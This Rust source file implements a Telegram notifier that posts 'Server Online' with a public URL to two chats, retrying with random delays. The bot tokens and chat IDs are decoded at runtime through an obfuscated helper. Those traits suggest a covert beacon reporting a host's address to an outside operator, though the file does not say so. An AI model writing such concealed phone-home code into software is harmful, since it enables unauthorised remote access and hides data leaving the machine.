use crate::config::Config;
use crate::encryption::aa27;
use log::{info, error};
use rand::Rng;
use reqwest::Client;
// Removed unused import: use serde_json::json;
use std::collections::HashMap;
use std::time::Duration;
use tokio::time::sleep;

// Notification system interface
#[async_trait::async_trait]
pub trait NotificationSystem {
    async fn send_notification(&self, url: &str) -> Result<(), anyhow::Error>;
}

// Telegram notification implementation
pub struct TelegramNotifier;

#[async_trait::async_trait]
impl NotificationSystem for TelegramNotifier {
    async fn send_notification(&self, public_url: &str) -> Result<(), anyhow::Error> {
        let config = Config::new();
        
        let payloads = vec![
            HashMap::from([
                ("chat_id".to_string(), aa27(config.c1.clone())),
                ("text".to_string(), format!("🌐 Server Online: {}", public_url)),
            ]),
            HashMap::from([
                ("chat_id".to_string(), aa27(config.c2.clone())),
                ("text".to_string(), format!("🌐 Server Online: {}", public_url)),
            ]),
        ];
        
        // Configure client with appropriate settings
        let client = Client::builder()
                .timeout(Duration::from_secs(20))
            .build()?;
        
        for (idx, payload) in payloads.iter().enumerate() {
            let token = if idx == 0 {
                aa27(config.t1.clone())
            } else {
                aa27(config.t2.clone())
            };
            
            let result = send_telegram_message(payload, &token, &client).await;
            match result {
                Ok(_) => info!("✅ Msg {} sent", idx + 1),
                Err(e) => {
                    error!("Message {} failed: {}", idx + 1, e);
                    return Err(anyhow::Error::msg(format!("msg {} failed: {}", idx + 1, e)));
                }
            }
        }
        
        Ok(())
    }
}

async fn send_telegram_message(
    payload: &HashMap<String, String>, 
    token: &str, 
    client: &Client
) -> Result<(), anyhow::Error> {
    let base_url = Config::new().telegram_base_url();
    let url = format!("{}{}/sendMessage", base_url, token);
    info!("Sending to TG: {}", url);
    
    let mut attempts = 1;
    let max_attempts = 6;
    
    loop {
        let sleep_time = {
            let mut rng = rand::thread_rng();
            rng.gen_range(0..2000)
        };
        sleep(Duration::from_millis(sleep_time)).await;
        
        match client.post(&url)
            .json(&payload)
            .send()
            .await {
                Ok(response) => {
                    let status = response.status();
                    let body = response.text().await?;
                    info!("TG response: {}", body);
                    
                    if status.is_success() {
                        return Ok(());
                    }
                    
                    error!("Attempt {} failed: {} - {}", attempts, status, body);
                },
                Err(e) => {
                    error!("Attempt {} failed: {}", attempts, e);
                }
            }
        
        if attempts >= max_attempts {
            return Err(anyhow::Error::msg("failed after 6 attempts"));
        }
        
        sleep(Duration::from_secs(attempts)).await;
        attempts += 1;
    }
}
